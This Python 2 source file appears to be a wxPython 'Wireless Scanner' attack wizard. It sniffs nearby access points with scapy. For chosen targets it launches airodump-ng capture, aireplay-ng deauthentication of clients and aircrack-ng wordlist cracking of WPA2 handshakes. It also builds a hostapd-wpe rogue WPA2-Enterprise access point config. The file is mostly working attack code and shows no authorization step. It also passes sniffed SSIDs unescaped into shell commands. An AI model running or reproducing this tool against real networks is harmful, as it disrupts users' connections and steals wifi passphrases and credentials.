from scapy.all import *
import os
from random import randint
import thread
from threading import Thread 
from wx.lib.pubsub import pub as Publisher
import wx
import wx.lib.scrolledpanel
import wless_commands

import subprocess
import time 
import threading

wpa2execute = True
wizardrun = True
check_ssid = ''
global out, err

out,err = '',''

def wpa2_psk_hack(ssid, bssid, channel):
	g_ssid = ssid 
	g_bssid = bssid
	g_channel = channel
	global check_ssid
	check_ssid = ssid
	if str(g_ssid) != '' or str(g_bssid) != '' or str(g_channel) != '':

		def exe1():
			time.sleep(2)
			os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
			os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
			# os.system('airmon-ng stop mon0')

			# os.system('iw dev wlan0 interface add mon0 type monitor')


			os.system('iwconfig mon0 channel %d' % g_channel)
			print 'stage1'
			attack_command = 'gnome-terminal -- airodump-ng -w ./Modules/capture/' + g_ssid+ ' --essid '+g_ssid+' --bssid '+g_bssid+ ' -c '+str(g_channel)+' mon0'
			os.system('gnome-terminal -- airodump-ng -w ./Modules/capture/' + g_ssid+ ' --essid '+g_ssid+' --bssid '+g_bssid+ ' -c '+str(g_channel)+' mon0')
			#~ proc = subprocess.Popen(attack_command.split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).pid
			#~ print 'stage2'
			
			#~ print 'gnome-terminal -- airodump-ng -w Modules/capture/' + g_ssid+ ' --essid '+g_ssid+' --bssid '+g_bssid+ ' -c '+str(g_channel)+' mon0'
			#~ print 'stage3'
			global out, err, wpa2execute
			global wpa2execute

			#~ deauth_command = 'gnome-terminal -- aireplay-ng --deauth 20 -e ' + ssid+ ' -a '+bssid+' mon0'
			#~ proc2 = subprocess.Popen(deauth_command.split(), shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).pid
			os.system('gnome-terminal -- aireplay-ng --deauth 20 -e ' + ssid+ ' -a '+bssid+' mon0')
			time.sleep(4)
			while wpa2execute:

				crack_command = "aircrack-ng ./Modules/capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt > ./Modules/Logs/wizard_ssid.tmp"
				# os.system("aircrack-ng ./capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt > ./Logs/wizard_ssid.tmp")
				os.system(crack_command)
				# proc3 = subprocess.Popen(crack_command.split(), shell=False, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).pid

				print "aircrack-ng ./capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt"
				handshake_test = ''
				myfile = open('./Modules/Logs/wizard_ssid.tmp','r').read()

				if 'Passphrase' in myfile:

					os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
					os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
					os.system("echo '' > ./Modules/Logs/wizard_ssid.tmp")
			
				


					wpa2execute = False
					#~ break
					exit
				else:
					print 'capture not found'
					time.sleep(10)
	
	wpa2thread = threading.Thread(target=exe1)
	wpa2thread.start()
	# wpa2thread.join()
	while wpa2thread.isAlive():
		pass


def repeater():
    # print 'repeater'

    if not os.path.isfile('./Modules/Logs/wizard_ssid.tmp'):
        os.system('touch ./Modules/Logs/wizard_ssid.tmp')

    if str(check_ssid) != '':

        os.system("aircrack-ng './capture/" + check_ssid + "'*.cap" + " -w /usr/share/wordlists/fasttrack.txt > ./Modules/Logs/wizard_ssid.tmp&")
        # print "aircrack-ng './Modules/capture/" + g_ssid + "'*.cap" + " -w /usr/share/wordlists/fasttrack.txt > ./Logs/wizard_ssid.tmp &"
    # ~ #     # ~ print "aircrack-ng ./Modules/capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt"
    # ~ handshake_test = ''
    # ~ #     print 'Executing aircrack ng check'

    if not os.path.isfile('./Modules/Logs/wizard_ssid.tmp'):
        os.system('touch ./Modules/Logs/wizard_ssid.tmp')


    myfile = str(open('./Modules/Logs/wizard_ssid.tmp', 'r').read())
    # if 'Passphrase' in myfile:
    # ~ #

    # test_string = str(open('checkme.txt','r').read())
    print myfile
    if 'passphrase' in myfile:
        global wpa2execute
        wpa2execute = True
        # print 'reapeter stopped'
        os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep aireplay-ng | head -1 | awk '{print $2}'`")
        os.system("echo '' > ./Modules/Logs/wizard_ssid.tmp")
        append_text = open('./Modules/Logs/assessment_logs.txt','ab')
        append_text.write('Handshake for '+ check_ssid + ' found')
        global scanner_busy
        scanner_busy = False
        time.sleep(2)


        exit()

    threading.Timer(5, repeater).start()



def check_status():
    if wpa2execute:
        repeater()
    else:
        exit()

threading.Timer(5, check_status).start()



def check_process(pName):
    global airodump_status

    proc1 = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = proc1.communicate()
    if pName in out:
        # global airodump_status
        airodump_status = True
        return True
    else:
        # global airodump_status
        airodump_status = False
        return False


def wpa2_ent_wizard(iface,ssid):
	configuration = """interface=%s
driver=nl80211
ssid=%s
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=6
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""" %(iface,ssid)

		
	hostapd_conf = open('./hostapd-wpe.conf-wizard', 'wb')
	hostapd_conf.write(configuration)
	hostapd_conf.close()
	os.system("/sbin/ldconfig -v")
	os.system("gnome-terminal -- radiusd -X &")
	os.system("/usr/local/etc/raddb/certs/bootstrap &")
	
	time.sleep(10)
	
	
		
		
	os.system("gnome-terminal -- hostapd ./hostapd-wpe.conf-wizard &")
	time.sleep(10)
	os.system("kill `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
	os.system("kill `ps aux | grep hostapd | head -1 | awk '{print $2}'`")

refresh_threader = True
ssids = set()
tssid = None
found_probe_request = []
found_client_mac = []
ssid_dictionary = {}
ssid_channel_dictionary = {}
mylist = set()
essid_details = set()
probe_dict = {}
essid_channel = {}

user_select_ssid = []

essid = None
channel = None
encryption = None
bssid = None
threadder = False
new_ssid = []

probeClient = None
probeSSID = None

connClient = None
connAP = None
connAPMAC = None

user_attack_select = {}

mac_dict = {}

def match_mac(string):
	match_mac = re.compile(ur'(?:[0-9a-fA-F]:?){12}')
	regex_match_mac = re.search(match_mac,string)
	return regex_match_mac.group(0)

def match_channel(string):
	match_channel = re.compile(ur'\[Channel\]-> [0-9]{1,2}')
	regex_match_channel = re.search(match_channel,string)
	return str(regex_match_channel.group(0)).replace('[Channel]->','')

def match_ssid(string):
	match_ssid = re.compile(ur'([ESSID](.*?)*:)')
	regex_match_ssid = re.search(match_ssid,string)
	match_ssid2 = re.compile(ur'\'.*\'')
	regex_match_ssid_real = re.search(match_ssid2,str(regex_match_ssid.group(0)))
	return str(regex_match_ssid_real.group(0)).replace('\'','')	

def wpa2_psk_attack(essid, bssid, channel):
	os.system("iwconfig mon0 channel "+str(channel))
	command = ("gnome-terminal -- airodump-ng --essid '%s' --bssid '%s' --write './capture/%s_crack' mon0 -c %s &"% (essid, bssid,essid,channel))
	os.system(command)	

if not os.path.isfile('./Modules/mac_addresses.lst'):
	os.system('touch ./Modules/mac_addresses.lst')
with open('./Modules/mac_addresses.lst','r') as f:
	
	for i in f:
		
		tmp = i.split('=')
		mac_dict[str(tmp[0]).strip()]=str(tmp[1]).strip()

############
found_probes = ''
found_ssids = ''
found_connected_clients = ''
############


class MySniffer(Thread):
	def __init__(self):
		
		Thread.__init__(self)
		global packet_capture
		self.start()
	
	def scapyStopper(self, x):
		return packet_capture == False
	
	wlan_ifaces = wless_commands.get_monitoring_interfaces()
	if not wlan_ifaces:
		
		wx.MessageBox('Failed to get a wireless interface. \nTry to resinsert USB wireless card', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
		

	mon_iface = wlan_ifaces[0]
	os.system('iw dev '+mon_iface+' interface add mon0 type monitor')
	os.system('ifconfig mon0 up')
	
	def channelHopper():
		while threadder:
			rChannel = randint(1,14)
			os.system('iwconfig mon0 channel %d'%rChannel)
		
			
	def run(self):
		sniff(iface='mon0', prn=self.packet_sniffer,stop_filter=self.scapyStopper)
	
	def stopper_flag(self):
		global threadder
		threadder = False
		return False 
		
	def stopper(self):
		sniff(iface='mon0', prn=self.packet_sniffer, stop_filter=self.stopper_flag)
	
	
	
	
	
	
	def packet_sniffer(self, pkt):
	
	
		
		
		
		if pkt.haslayer(Dot11Beacon):
			##################### WIFI SNIFFER WITH ENCRYPTION #################
			temp = pkt
			
			while temp:
				ssid_details = []
				global ssid_dictionary
				global ssid_channel_dictionary
				
				temp = temp.getlayer(Dot11Elt)
				cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}" "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
				
				
	
				
				if temp and temp.ID == 0 and (pkt.addr3 not in ssids):
					global essid
					global bssid
					global ssid_dictionary
					global ssid_channel_dictionary
					global channel
					
					
					
				
					
					
					
					
						
					#~ if essid.decode('ascii'):
					if essid:
						essid = pkt.info
						#~ print essid 
						ssid_dictionary[bssid] = repr(essid)
						if not essid:
							essid = 'Unknown'
						
					else:
						essid = 'Unknown'
						ssid_dictionary[bssid] = repr(essid)
				
					
					bssid = pkt.addr3
					ssid_dictionary[bssid] = repr(essid)
				
	
				
				elif temp and temp.ID == 3:
					#~ print '****'
					#~ print ord(temp.info)
					global channel 
					global ssid_channel_dictionary
					
					try:
						channel = ord(temp.info)
					except:
						channel = ''
					
					ssid_channel_dictionary[bssid] = repr(essid) +'-'+str(channel)
					
				elif temp and temp.ID == 221:
					encryption = 'WPA/WPA2'
					
			
					
					
					global tssid, mac_dict
					
					try:
						manufacturer = str(bssid[0:8]).replace(':','-').upper()
						manufactuerer_id = str(mac_dict[manufacturer])
					except:
					
						manufactuerer_id = 'Unknown device'
										#~ 
					tssid = str('[MAC Addr]-> '+str(bssid) + ' : [ESSID]-> ' + repr(essid) +' : [Channel]-> ' + str(channel)+' \t\t: [Encr]-> ' + str(encryption) + '\t :[Manufacturer]-> '+manufactuerer_id)
					tempSSID2 = str(str(bssid) + '-' + repr(essid) + '-' +str(channel)) 
					ssid_dictionary[bssid]=essid
					#~ print ssid_dictionary
					######### write to file #######
						
					
					#
					if repr(essid) not in new_ssid:
						
						global found_ssids
						
						new_ssid.append(repr(essid))
						found_ssids = repr(essid)
						
						######## write to file #######
						try:
							
							with open('./Modules/Logs/sniffer/access_list.txt','a') as f:
								f.write(tssid+'\n')
						except:
							print 'not printable'	
						with open('./Modules/Logs/sniffer/deauthSSID.txt','a') as g:
							g.write(tempSSID2+',')
						######## write to file #######
						
					
				
					
					
					
					break
					 	
					
				temp = temp.payload
			##################### WIFI SNIFFER WITH ENCRYPTION #################	
		
				
	
class SnifferGUI(wx.Frame):
	def __init__(self, parent, title):
		super(SnifferGUI, self).__init__(parent, title=title, size=(1120,1400))
		
		self.InitUI()
		self.Centre()
		self.Show()
	
	def InitUI(self):
    	
    	#~ self.scroll = wx.ScrolledWindow(self, -1)	
		
		
		global SSID_textControl
		global ConnectionsTextControl
		global probeTextControl
		

		panel = wx.lib.scrolledpanel.ScrolledPanel(self,-1, size=(1110,1400),pos=(0,28)) #wx.Panel(self)
		panel.SetBackgroundColour('#98a3b2')
		panel.SetupScrolling()
		
		
		
		menubar = wx.MenuBar()
		fileMenu = wx.Menu()
		fileMenu2 = wx.Menu()
		fitem = fileMenu.Append(-1, 'Start Sniffer', 'Start sniffer')
		fitem2 = fileMenu.Append(-1, 'Stop Sniffer', 'Stop Sniffer')
		fitem3 = fileMenu.Append(-1, 'Quit Sniffer', 'Quit Sniffer')
		fitem4 = fileMenu2.Append(-1, 'Configure Wizard', 'Configure Wizard')
		
		menubar.Append(fileMenu, 'Scanner')
		menubar.Append(fileMenu2, 'Wizard Settings')
		self.SetMenuBar(menubar)
		
		self.Bind(wx.EVT_MENU, self.OnStartSniff, fitem)
		self.Bind(wx.EVT_MENU, self.OnStopSniff, fitem2)
		self.Bind(wx.EVT_MENU, self.onQuitApp, fitem3)
		self.Bind(wx.EVT_MENU, self.onAttack, fitem4)


		self.panel_new = panel
		
				
        
		self.on_timer()
		
		
		
	def onAttack(self, event):
		frame = AttackFrame(None, 'Wireless Scanner')
		frame.Show()
		
		


		
	def OnStopSniff(self, event):
		global packet_capture
		global refresh_threader
		global threadder
		
		threadder = False
		packet_capture = False
		refresh_threader = False
	
	
	def OnStartSniff(self, event):
		global packet_capture
		global refresh_threader
		global threadder
		threadder = True
		refresh_threader = True

		packet_capture =True

		MySniffer()
	
	def onQuitApp(self, event):

		os.system('echo ""> ./Modules/Logs/sniffer/access_list.txt')
		os.system("kill `ps aux | grep wifi-sniffer-finalv10 | head -1 | awk '{print $2}'`")
		self.Close()
	
	
	def channelHopper2(self):
		
		
		while threadder:
			rChannel = randint(1,14)
			os.system('iwconfig mon0 channel %d'%rChannel)
			
		
	def on_timer(self):
		global ssid_list
		

		rChannel = randint(1,14)
		os.system('iwconfig mon0 channel %d'%rChannel)
		os.system('touch ./Modules/Logs/sniffer/access_list.txt')
		
		ssid_list = open('./Modules/Logs/sniffer/access_list.txt','r').readlines()
		pos = 0
		
		
		def onSelectCheckbox(event):
			
			if event.IsChecked():
				global user_select_ssid
				global essid_channel
				user_select_ssid = event.GetEventObject().GetLabel()
				user_attack_select[match_mac(user_select_ssid)]=match_ssid(user_select_ssid)
				essid_channel[match_mac(user_select_ssid)]=int(match_channel(user_select_ssid)) 
				
				
				#~ print user_attack_select
		
			
		
		
		for i in ssid_list:
			
			

			if len(str(i)) > 10:
				cb = wx.CheckBox(self.panel_new,label=str(i),pos=(10,pos))
				cb.Bind(wx.EVT_CHECKBOX,onSelectCheckbox,cb)
				
				
			pos +=40
		

		
		
		
		
		
		if refresh_threader == True:
			wx.CallLater(2000, self.on_timer)
			
			rChannel = randint(1,14)
			os.system('iwconfig mon0 channel %d'%rChannel)
		
		
	
	

class AttackFrame(wx.Frame):
	def __init__(self, parent, title):
		super(AttackFrame, self).__init__(parent, title=title, size=(900,700))
		
		self.InitUI()
		self.Centre()
		self.Show()
	
	def InitUI(self):
    	
		
		panel = wx.lib.scrolledpanel.ScrolledPanel(self,-1, size=(900,700)) #wx.Panel(self)
		panel.SetBackgroundColour('#98a3b2')
		panel.SetupScrolling()
		
		menubar = wx.MenuBar()
		fileMenu = wx.Menu()
		attackm = fileMenu.Append(-1, 'Start Attack','Start Attack')
		menubar.Append(fileMenu, 'Attack')
		self.SetMenuBar(menubar)
		
		font = wx.Font(25, wx.DECORATIVE, wx.ITALIC, wx.NORMAL)
		
		self.Attack_vectors = wx.StaticText(panel,wx.ID_ANY, label="\tFollowing Targets are defined",pos=(20,20))
		self.Attack_vectors.SetFont(font)
		
		
		attack_string = """
			Type of attacks to be performed
			
						WPA2 
						WPA2 Enterprise Attack
		"""
		
		self.target_list = wx.StaticText(panel,wx.ID_ANY, label="",pos=(20,70))
		pos = 70
		for key, value in user_attack_select.iteritems():
			self.target_list = wx.StaticText(panel,wx.ID_ANY, label=key +" On channel " + str(essid_channel[key])+'  <--->  '+value+attack_string,pos=(20,pos))
			pos +=220
			
		
		
		
		
		self.Bind(wx.EVT_MENU, self.wizard_attack, attackm)
	
	
	
			


	def wizard_attack(self, event):
		
		print 'Started the attack'
		
			
		
			
		for key, value in user_attack_select.iteritems():
			global wpa2execute
			wpa2execute = True
			checkairodump = check_process("airodump-ng")

			time.sleep(5)

			print 'started PSK attack on ' + value, key, essid_channel[key]
			if wpa2execute:
				wpa2_psk_hack(value, key,essid_channel[key])
				os.system("iwconfig mon0 channel "+str(essid_channel[key]))
				print 'WPA2 Attack for SSID: ' + value +'is performed'
				
			else:
				
				wpa2execute = True
			
			# wlan_ifaces = wless_commands.get_monitoring_interfaces()
			# if not wlan_ifaces:
            #
			# 	wx.MessageBox('Failed to get a wireless interface. \nTry to resinsert USB wireless card', 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
            #
			# else:
			# 	mon_iface = wlan_ifaces[0]
			# 	wpa2_ent_wizard(mon_iface,value)
			
			






def main():
	
	packet_capture = False
	
	app = wx.App(False)
	frame = SnifferGUI(None, 'Wireless Scanner')
	app.MainLoop()


	

#~ if __name__ == '__main__':
main()	




